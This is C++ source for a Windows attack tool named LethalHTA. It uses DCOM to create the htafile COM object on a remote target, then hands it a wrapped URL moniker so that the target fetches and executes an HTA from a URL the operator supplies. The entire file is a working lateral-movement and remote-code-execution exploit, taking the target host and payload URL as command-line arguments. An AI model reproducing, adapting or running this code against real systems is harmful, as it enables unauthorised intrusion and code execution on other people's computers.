// LethalHTA.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <ole2.h>
#include <comdef.h>
#pragma comment(lib, "Urlmon.lib")

GUID guidObject = { 0x79eac9e0,0xbaf9,0x11ce,{ 0x8c,0x82,0x00,0xaa,0x00,0x4b,0xa9,0x0b } };

static bstr_t IIDToBSTR(REFIID riid)
{
	LPOLESTR str;
	bstr_t ret = "Unknown";
	if (SUCCEEDED(StringFromIID(riid, &str)))
	{
		ret = str;
		CoTaskMemFree(str);
	}
	return ret;
}

class FakeObject : public IMarshal, public IMoniker
{
	LONG m_lRefCount;
	IMonikerPtr _moniker;
	IMarshalPtr _marshal;

public:
	//Constructor, Destructor
	FakeObject(IMonikerPtr moniker) {
		_moniker = moniker;
		moniker->QueryInterface(&_marshal);
		m_lRefCount = 1;
	}

	~FakeObject() {};

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{
		if (riid == __uuidof(IUnknown))
		{
			*ppvObj = this;
		}
		else if (riid == __uuidof(IMoniker))
		{
			*ppvObj = static_cast<IMoniker*>(this);
		}
		else if (riid == __uuidof(IMarshal))
		{
			*ppvObj = static_cast<IMarshal*>(this);
		}
		else
		{
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		((IUnknown*)*ppvObj)->AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			_moniker = NULL;
			_marshal = NULL;
			delete this;
		}

		return ulCount;
	}

	virtual /* [local] */ HRESULT STDMETHODCALLTYPE BindToObject(
		/* [annotation][unique][in] */
		_In_  IBindCtx *pbc,
		/* [annotation][unique][in] */
		_In_opt_  IMoniker *pmkToLeft,
		/* [annotation][in] */
		_In_  REFIID riidResult,
		/* [annotation][iid_is][out] */
		_Outptr_  void **ppvResult) {
		return _moniker->BindToObject(pbc, pmkToLeft, riidResult, ppvResult);

	}

	virtual /* [local] */ HRESULT STDMETHODCALLTYPE BindToStorage(
		/* [annotation][unique][in] */
		_In_  IBindCtx *pbc,
		/* [annotation][unique][in] */
		_In_opt_  IMoniker *pmkToLeft,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][iid_is][out] */
		_Outptr_  void **ppvObj) {
		return _moniker->BindToStorage(pbc, pmkToLeft, riid, ppvObj);
	}

	virtual HRESULT STDMETHODCALLTYPE Reduce(
		/* [unique][in] */ __RPC__in_opt IBindCtx *pbc,
		/* [in] */ DWORD dwReduceHowFar,
		/* [unique][out][in] */ __RPC__deref_opt_inout_opt IMoniker **ppmkToLeft,
		/* [out] */ __RPC__deref_out_opt IMoniker **ppmkReduced) {

		return _moniker->Reduce(pbc, dwReduceHowFar, ppmkToLeft, ppmkReduced);
	}

	virtual HRESULT STDMETHODCALLTYPE ComposeWith(
		/* [unique][in] */ __RPC__in_opt IMoniker *pmkRight,
		/* [in] */ BOOL fOnlyIfNotGeneric,
		/* [out] */ __RPC__deref_out_opt IMoniker **ppmkComposite) {

		return _moniker->ComposeWith(pmkRight, fOnlyIfNotGeneric, ppmkComposite);
	}

	virtual HRESULT STDMETHODCALLTYPE Enum(
		/* [in] */ BOOL fForward,
		/* [out] */ __RPC__deref_out_opt IEnumMoniker **ppenumMoniker) {
		return _moniker->Enum(fForward, ppenumMoniker);
	}

	virtual HRESULT STDMETHODCALLTYPE IsEqual(
		/* [unique][in] */ __RPC__in_opt IMoniker *pmkOtherMoniker) {
		return _moniker->IsEqual(pmkOtherMoniker);
	}

	virtual HRESULT STDMETHODCALLTYPE Hash(
		/* [out] */ __RPC__out DWORD *pdwHash) {
		return _moniker->Hash(pdwHash);
	}

	virtual HRESULT STDMETHODCALLTYPE IsRunning(
		/* [unique][in] */ __RPC__in_opt IBindCtx *pbc,
		/* [unique][in] */ __RPC__in_opt IMoniker *pmkToLeft,
		/* [unique][in] */ __RPC__in_opt IMoniker *pmkNewlyRunning) {

		return _moniker->IsRunning(pbc, pmkToLeft, pmkNewlyRunning);
	}

	virtual HRESULT STDMETHODCALLTYPE GetTimeOfLastChange(
		/* [unique][in] */ __RPC__in_opt IBindCtx *pbc,
		/* [unique][in] */ __RPC__in_opt IMoniker *pmkToLeft,
		/* [out] */ __RPC__out FILETIME *pFileTime) {
		return _moniker->GetTimeOfLastChange(pbc, pmkToLeft, pFileTime);
	}

	virtual HRESULT STDMETHODCALLTYPE Inverse(
		/* [out] */ __RPC__deref_out_opt IMoniker **ppmk) {
		return _moniker->Inverse(ppmk);
	}

	virtual HRESULT STDMETHODCALLTYPE CommonPrefixWith(
		/* [unique][in] */ __RPC__in_opt IMoniker *pmkOther,
		/* [out] */ __RPC__deref_out_opt IMoniker **ppmkPrefix) {
		return _moniker->CommonPrefixWith(pmkOther, ppmkPrefix);
	}

	virtual HRESULT STDMETHODCALLTYPE RelativePathTo(
		/* [unique][in] */ __RPC__in_opt IMoniker *pmkOther,
		/* [out] */ __RPC__deref_out_opt IMoniker **ppmkRelPath) {

		return _moniker->RelativePathTo(pmkOther, ppmkRelPath);
	}

	virtual HRESULT STDMETHODCALLTYPE GetDisplayName(
		/* [unique][in] */ __RPC__in_opt IBindCtx *pbc,
		/* [unique][in] */ __RPC__in_opt IMoniker *pmkToLeft,
		/* [out] */ __RPC__deref_out_opt LPOLESTR *ppszDisplayName) {
		return _moniker->GetDisplayName(pbc, pmkToLeft, ppszDisplayName);
	}

	virtual HRESULT STDMETHODCALLTYPE ParseDisplayName(
		/* [unique][in] */ __RPC__in_opt IBindCtx *pbc,
		/* [unique][in] */ __RPC__in_opt IMoniker *pmkToLeft,
		/* [in] */ __RPC__in LPOLESTR pszDisplayName,
		/* [out] */ __RPC__out ULONG *pchEaten,
		/* [out] */ __RPC__deref_out_opt IMoniker **ppmkOut) {

		return _moniker->ParseDisplayName(pbc, pmkToLeft, pszDisplayName, pchEaten, ppmkOut);
	}

	virtual HRESULT STDMETHODCALLTYPE IsSystemMoniker(
		/* [out] */ __RPC__out DWORD *pdwMksys) {

		return _moniker->IsSystemMoniker(pdwMksys);
	}

	virtual HRESULT STDMETHODCALLTYPE IsDirty(void) {
		return  _moniker->IsDirty();
	}

	virtual HRESULT STDMETHODCALLTYPE Load(
		/* [unique][in] */ __RPC__in_opt IStream *pStm) {
		return  _moniker->Load(pStm);
	}

	virtual HRESULT STDMETHODCALLTYPE Save(
		/* [unique][in] */ __RPC__in_opt IStream *pStm,
		/* [in] */ BOOL fClearDirty) {
		return  _moniker->Save(pStm, fClearDirty);
	}

	virtual HRESULT STDMETHODCALLTYPE GetSizeMax(
		/* [out] */ __RPC__out ULARGE_INTEGER *pcbSize) {
		return  _moniker->GetSizeMax(pcbSize);
	}
	virtual HRESULT STDMETHODCALLTYPE GetClassID(
		/* [out] */ __RPC__out CLSID *pClassID) {
		return  _moniker->GetClassID(pClassID);
	}



	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  CLSID *pCid)
	{
		return _marshal->GetUnmarshalClass(riid, pv, MSHCTX_NOSHAREDMEM, pvDestContext, mshlflags, pCid);
	}

	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  DWORD *pSize)
	{
		return _marshal->GetMarshalSizeMax(riid, pv, MSHCTX_NOSHAREDMEM, pvDestContext, mshlflags, pSize);
	}

	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{
		return _marshal->MarshalInterface(pStm, riid, pv, MSHCTX_NOSHAREDMEM, pvDestContext, mshlflags);
	}

	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][out] */
		_Outptr_  void **ppv)
	{
		return E_NOTIMPL;
	}

	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
		/* [annotation][unique][in] */
		_In_  IStream *pStm)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
		/* [annotation][in] */
		_In_  DWORD dwReserved)
	{
		return S_OK;
	}
};

int wmain(int argc, wchar_t *argv[], wchar_t *envp[])
{
	GUID gHtafile = { 0x3050f4d8,0x98b5,0x11cf,{ 0xbb,0x82,0x00,0xaa,0x00,0xbd,0xce,0x0b } };
	HRESULT hr;
	IUnknownPtr pOut;
	IPersistMonikerPtr pPersMon;
	IMonikerPtr pMoniker;

	MULTI_QI* rgQI = new MULTI_QI[1];
	COSERVERINFO stInfo = { 0 };
	WCHAR pwszTarget[MAX_PATH];
	WCHAR pwszHta[MAX_PATH];

	if (argc != 3) {
		printf("LethalHTA.exe target url/to/hta");
		return -1;
	}
	wcscpy_s(pwszTarget, MAX_PATH, argv[1]);
	wcscpy_s(pwszHta, MAX_PATH, argv[2]);

	rgQI[0].pIID = &IID_IUnknown;
	rgQI[0].pItf = NULL;
	rgQI[0].hr = 0;

	stInfo.pwszName = pwszTarget;
	stInfo.dwReserved1 = 0;
	stInfo.dwReserved2 = 0;
	stInfo.pAuthInfo = nullptr;

	CoInitialize(0);
	hr = CreateURLMonikerEx(NULL, pwszHta, &pMoniker, 0);
	hr = CoCreateInstanceEx(gHtafile, NULL, CLSCTX_REMOTE_SERVER, &stInfo, 1, rgQI);

	if (hr != S_OK)
	{
		printf("Creating htafile COM object failed on target");
	}

	pOut = rgQI[0].pItf;
	hr = pOut->QueryInterface(&pPersMon);

	FakeObject* pFake = new FakeObject(pMoniker);
	hr = pPersMon->Load(FALSE, pFake, NULL, STGM_READ);
	pFake->Release();
	pMoniker = NULL;
	pPersMon = NULL;
	pOut = NULL;
}

